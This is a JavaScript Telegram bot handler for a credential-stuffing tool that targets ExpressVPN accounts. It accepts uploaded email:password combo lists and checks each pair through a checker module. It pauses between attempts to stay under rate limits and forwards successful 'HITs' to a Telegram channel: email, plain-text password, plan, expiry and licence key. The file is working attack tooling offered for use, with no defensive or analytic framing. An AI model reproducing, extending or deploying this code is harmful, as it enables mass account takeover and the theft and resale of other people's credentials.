// api/telegram.js – ExpressVPN Bot with file queue system
import { checkExpressVPN } from '../lib/expressChecker.js';
import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from '../lib/config.js';

// ===== In-memory file queue per chat =====
// প্রতিটি chatId-এর জন্য একটি queue থাকবে
const chatQueues = new Map(); // chatId -> { active: bool, files: [], current: null }

function getQueue(chatId) {
  if (!chatQueues.has(chatId)) {
    chatQueues.set(chatId, { active: false, files: [], current: null });
  }
  return chatQueues.get(chatId);
}

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  const body = req.body;
  if (!body.message) return res.status(200).json({ ok: true });

  const chatId = body.message.chat.id;
  const text = body.message.text;
  const document = body.message.document;

  // ===== /start =====
  if (text === '/start') {
    await sendMessage(chatId, 
      "🤖 *ExpressVPN Checker Bot*\n\n" +
      "Send me one or more `.txt` files with combos:\n" +
      "`email:password` (one per line)\n\n" +
      "I'll process them *one by one* and forward HITs to the channel.\n\n" +
      "Commands:\n" +
      "/status — Show queue status\n" +
      "/cancel — Cancel all pending files"
    );
    return res.status(200).json({ ok: true });
  }

  // ===== /status =====
  if (text === '/status') {
    const q = getQueue(chatId);
    let msg = `📊 *Queue Status*\n\n`;
    if (q.current) {
      msg += `🔁 *Currently processing:* ${q.current.fileName}\n`;
      msg += `📂 *Files in queue:* ${q.files.length}\n`;
    } else {
      msg += `📭 No file currently processing.\n`;
      msg += `📂 *Files in queue:* ${q.files.length}\n`;
    }
    if (q.files.length > 0) {
      msg += `\n*Pending files:*\n`;
      q.files.forEach((f, i) => { msg += `${i + 1}. ${f.fileName}\n`; });
    }
    await sendMessage(chatId, msg);
    return res.status(200).json({ ok: true });
  }

  // ===== /cancel =====
  if (text === '/cancel') {
    const q = getQueue(chatId);
    q.files = [];
    await sendMessage(chatId, "🗑️ All pending files cancelled.");
    return res.status(200).json({ ok: true });
  }

  // ===== File upload =====
  if (document && document.mime_type === 'text/plain') {
    const q = getQueue(chatId);
    const fileInfo = {
      fileId: document.file_id,
      fileName: document.file_name || 'combos.txt'
    };
    q.files.push(fileInfo);

    const position = q.files.length;
    await sendMessage(chatId, `📥 *${fileInfo.fileName}* added to queue (position: ${position}).`);

    // যদি কিছু চলছে না, শুরু করো
    if (!q.active) {
      processQueue(chatId);
    }

    return res.status(200).json({ ok: true });
  }

  return res.status(200).json({ ok: true });
}

// ===== Queue Processor =====
async function processQueue(chatId) {
  const q = getQueue(chatId);
  if (q.active) return;              // already processing
  if (q.files.length === 0) {        // nothing left
    q.active = false;
    q.current = null;
    return;
  }

  q.active = true;
  const fileInfo = q.files.shift();
  q.current = fileInfo;

  try {
    await sendMessage(chatId, `🚀 *Starting:* ${fileInfo.fileName}\n(${q.files.length} file(s) still queued)`);

    // 1. ডাউনলোড ফাইল
    const fileUrl = await getFileUrl(fileInfo.fileId);
    if (!fileUrl) {
      await sendMessage(chatId, `❌ Failed to get file: ${fileInfo.fileName}`);
      q.active = false;
      q.current = null;
      return processQueue(chatId); // পরের ফাইলে যাও
    }

    const fileContent = await downloadFile(fileUrl);
    if (!fileContent) {
      await sendMessage(chatId, `❌ Failed to download: ${fileInfo.fileName}`);
      q.active = false;
      q.current = null;
      return processQueue(chatId);
    }

    // 2. কম্বো পার্স
    const lines = fileContent.split(/\r?\n/);
    const combos = [];
    for (const line of lines) {
      const t = line.trim();
      if (!t) continue;
      const idx = t.indexOf(':');
      if (idx === -1) continue;
      const u = t.slice(0, idx).trim();
      const p = t.slice(idx + 1).trim();
      if (u && p) combos.push({ username: u, password: p });
    }

    if (combos.length === 0) {
      await sendMessage(chatId, `⚠️ No valid combos in ${fileInfo.fileName}`);
      q.active = false;
      q.current = null;
      return processQueue(chatId);
    }

    await sendMessage(chatId, `📊 *${fileInfo.fileName}*: ${combos.length} combos. Checking...`);

    // 3. চেকিং (সিরিয়াল)
    let hits = 0;
    const startTime = Date.now();

    for (let i = 0; i < combos.length; i++) {
      const combo = combos[i];
      const result = await checkExpressVPN(combo.username, combo.password);

      if (result.hit) {
        hits++;
        await forwardToChannel(result);
      }

      // প্রতি ১০টি বা শেষে প্রগ্রেস
      if ((i + 1) % 10 === 0 || i + 1 === combos.length) {
        await sendMessage(chatId, `📊 *${fileInfo.fileName}*\nProgress: ${i + 1}/${combos.length} | HITs: ${hits}`);
      }

      // রেট লিমিট এড়াতে ছোট বিরতি
      await new Promise(r => setTimeout(r, 400));
    }

    const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
    await sendMessage(chatId, 
      `✅ *Done:* ${fileInfo.fileName}\n` +
      `Total: ${combos.length} | 🔥 HITs: ${hits}\n` +
      `⏱️ Time: ${elapsed}s`
    );

  } catch (err) {
    await sendMessage(chatId, `❌ Error processing ${fileInfo.fileName}: ${err.message}`);
  }

  q.active = false;
  q.current = null;

  // পরের ফাইল প্রসেস করো
  if (q.files.length > 0) {
    setTimeout(() => processQueue(chatId), 500);
  }
}

// ===== Helper: Send message =====
async function sendMessage(chatId, text) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: 'Markdown'
      })
    });
  } catch (e) {}
}

// ===== Helper: Get file URL =====
async function getFileUrl(fileId) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getFile?file_id=${fileId}`;
  try {
    const res = await fetch(url);
    const data = await res.json();
    if (data.ok && data.result.file_path) {
      return `https://api.telegram.org/file/bot${TELEGRAM_BOT_TOKEN}/${data.result.file_path}`;
    }
  } catch (e) {}
  return null;
}

// ===== Helper: Download file =====
async function downloadFile(fileUrl) {
  try {
    const res = await fetch(fileUrl);
    return await res.text();
  } catch (e) {
    return null;
  }
}

// ===== Helper: Forward HIT to channel =====
async function forwardToChannel(result) {
  if (!TELEGRAM_CHAT_ID) return;
  const message = `🎯 *ExpressVPN HIT*\n\n` +
                  `📧 *Email:* ${result.email}\n` +
                  `🔑 *Password:* \`${result.password}\`\n` +
                  `📋 *Plan:* ${result.plan || '—'}\n` +
                  `📅 *Expiry:* ${result.expiry || '—'}\n` +
                  `🔑 *PC Key:* ${result.pcKey || '—'}\n` +
                  `📅 *Key Expiry:* ${result.keyExpire || '—'}\n` +
                  `📌 *Status:* ${result.keyStatus || '—'}\n\n` +
                  `#ExpressVPN @SHAKIB2016`;
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
        disable_web_page_preview: true
      })
    });
  } catch (e) {}
}
